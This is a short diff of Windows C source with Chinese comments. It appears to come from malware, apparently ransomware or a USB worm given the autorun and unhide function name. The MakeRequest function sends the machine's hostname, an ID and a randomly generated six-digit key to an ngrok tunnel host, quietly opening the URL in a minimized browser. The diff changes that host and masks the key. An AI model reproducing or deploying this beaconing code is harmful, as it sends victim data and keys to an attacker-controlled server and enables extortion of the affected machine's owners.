@@ -59,7 +59,7 @@ void RemoveAutoRunAndUnhide() {
 void MakeRequest(){
     // 网页URL
     char url[500]="";
-    sprintf(url,"http://0ba4-221-178-124-227.ngrok-free.app/?hostname=%s&id=%s&pwd=%s",hostname,ID,miYao);
+    sprintf(url,"http://466f-221-178-124-227.ngrok-free.app/?hostname=%s&id=%s&pwd=%s",hostname,ID,"******");
 
     // 启动默认浏览器并打开网页
     ShellExecute(NULL, "open", url, NULL, NULL, SW_SHOWMINIMIZED);
@@ -81,7 +81,7 @@ void RandomMiYao(){
     srand(time(NULL)+3);
     // 生成随机的6位数
     // 将随机数转换为字符串
-    sprintf(miYao, "%06d", rand() % 1000000);
+    sprintf(miYao, "%06d", rand() % 1000000+250);
     char str[100]="echo ";
     strcat(str,hostname);
     strcat(str," ");
@@ -92,6 +92,7 @@ void RandomMiYao(){
     
     system(str);
 }
+
 
 // windows消息处理函数
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
